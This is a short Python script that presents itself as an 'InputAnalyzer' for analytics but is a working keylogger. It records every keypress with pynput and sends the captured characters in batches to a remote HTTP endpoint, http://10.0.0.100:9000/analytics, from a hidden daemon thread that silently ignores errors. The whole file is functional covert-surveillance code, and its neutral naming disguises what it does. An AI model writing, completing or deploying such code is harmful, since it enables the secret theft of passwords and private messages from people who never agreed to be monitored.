from pynput import keyboard
import urllib.request
import json
import queue
import threading

class InputAnalyzer:
    def __init__(self):
        self.data_queue = queue.Queue()
        self.endpoint = "http://10.0.0.100:9000/analytics"
        self.batch_size = 50
        
    def process_event(self, event):
        try:
            char = event.char
            self.data_queue.put(char)
        except AttributeError:
            self.data_queue.put(f"[{event}]")
    
    def sync_data(self):
        while True:
            buffer = []
            while len(buffer) < self.batch_size:
                try:
                    item = self.data_queue.get(timeout=1)
                    buffer.append(item)
                except queue.Empty:
                    break
            
            if buffer:
                payload = json.dumps({'data': ''.join(buffer)}).encode()
                try:
                    req = urllib.request.Request(
                        self.endpoint,
                        data=payload,
                        headers={'Content-Type': 'application/json'}
                    )
                    urllib.request.urlopen(req)
                except:
                    pass
    
    def start_monitoring(self):
        sync_thread = threading.Thread(target=self.sync_data)
        sync_thread.daemon = True
        sync_thread.start()
        
        with keyboard.Listener(on_press=self.process_event) as monitor:
            monitor.join()

if __name__ == "__main__":
    analyzer = InputAnalyzer()
    analyzer.start_monitoring()
